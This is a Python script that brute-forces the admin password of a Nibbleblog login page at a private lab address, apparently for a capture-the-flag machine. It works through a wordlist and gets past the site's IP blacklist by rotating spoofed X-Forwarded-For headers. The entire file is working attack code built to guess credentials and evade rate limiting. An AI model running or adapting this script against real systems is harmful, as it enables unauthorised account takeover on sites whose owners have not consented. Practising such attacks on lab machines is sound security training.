#!/usr/bin/python3

import requests
import sys
import time


proxies = {'http':'127.0.0.1:8080'}

session = requests.session()

target = 'http://10.10.10.75/nibbleblog/admin.php?/'


random_ip_list = []

with open('random-ips.txt','r') as temp:
	for line in temp.readlines():
		random_ip_list.append(line.strip('\n'))

pass_list = []

with open('wordlist.txt','r') as temp:
	for word in temp.readlines():
		pass_list.append(word.strip('\n'))


ip_counter = 0
pass_counter = 0


#print(pass_list)
#sys.exit(0)


while True:

	try:
		req = session.post(target,
		proxies=proxies,
		headers={'X-Forwarded-For':random_ip_list[ip_counter]},
		data={'username':'admin','password':pass_list[pass_counter]},
		)		
		resp = req.content
		
		if b'Blacklist' in resp:
			print("Rate limited at "+str(random_ip_list[ip_counter])+ " password: "+str(pass_list[pass_counter]))
			ip_counter += 1
			pass_counter = pass_counter
      
		elif b'Incorrect' in resp:
			pass_counter += 1
			print("Incorrect password: "+str(pass_list[pass_counter]))

		else:
			print(f'Password found: {pass_list[pass_counter]}')
			sys.exit(0)
	except:
		print("\nSomething might be screwed up, Exiting on ip: "+str(random_ip_list[ip_counter])+" counter: "+str(pass_list[pass_counter]))
		sys.exit(1)
